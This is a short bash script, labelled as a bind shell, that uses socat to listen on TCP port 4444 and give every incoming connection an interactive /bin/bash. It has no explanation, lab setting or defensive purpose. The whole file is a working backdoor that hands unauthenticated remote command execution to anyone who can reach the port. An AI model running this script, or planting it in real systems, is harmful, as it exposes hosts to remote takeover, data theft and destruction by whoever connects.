#!/bin/bash

# Bind shell on port 4444
PORT=4444
socat TCP-LISTEN:$PORT,fork EXEC:/bin/bash
